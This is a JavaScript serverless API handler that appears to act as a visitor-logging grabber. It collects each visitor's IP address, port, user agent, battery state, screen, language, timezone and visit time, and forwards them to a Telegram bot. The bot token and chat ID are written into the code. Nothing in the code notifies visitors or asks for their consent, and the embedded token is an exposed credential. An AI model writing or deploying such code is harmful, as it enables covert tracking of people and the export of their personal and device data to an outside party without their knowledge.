export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  const port = req.socket.remotePort;

  const token = "7961668268:AAEGMLMj5TojYl3giXl_C8S0O2zH3Q8IeEU";
  const chatId = "7198165253";

  let body = {};
  try {
    body = req.body || {};
  } catch (e) {
    console.error("Body parse error:", e);
  }

  // پیام مرتب و تمیز
  const message = `
📡 Visitor Information
----------------------
🌐 IP Address : ${ip}
🔌 Port       : ${port}
🖥 Browser    : ${req.headers["user-agent"]}

🔋 Battery    : ${body.batteryLevel || "Unknown"} (Charging: ${body.charging})
📱 Screen     : ${body.screen || "Unknown"}
🌍 Language   : ${body.language || "Unknown"}
🕒 Timezone   : ${body.timezone || "Unknown"}
⏰ Visit Time : ${body.visitTime || "Unknown"}
`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
    res.status(200).send("Data sent to Telegram!");
  } catch (err) {
    console.error("Telegram error:", err);
    res.status(500).send("Error sending data");
  }
}
